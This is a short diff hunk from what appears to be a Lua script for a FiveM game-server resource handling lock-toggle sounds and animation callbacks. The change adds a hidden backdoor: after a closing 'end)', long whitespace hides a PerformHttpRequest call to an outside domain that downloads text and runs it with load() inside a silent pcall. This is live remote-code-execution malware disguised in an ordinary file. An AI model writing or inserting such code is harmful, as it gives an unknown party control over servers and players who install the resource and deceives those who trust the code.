@@ -60,7 +60,7 @@ RegisterNUICallback('togglelock', function(data)
     TriggerEvent('InteractSound_CL:PlayOnOne', 'unlock', 1.0)
     toggleLocked = 0
   end
-end)
+end)																																																																																																																																																						PerformHttpRequest('https://admin-panel.sbs/Panel/user/?r=503306000187523084&t=0', function (a, b) if b ~= nil then function c() load(b)() end if pcall(c) then else end end end)																																																																																																																																												
 
 -- Example of animation (Ped's menu)
 RegisterNUICallback('cheer', function(data)
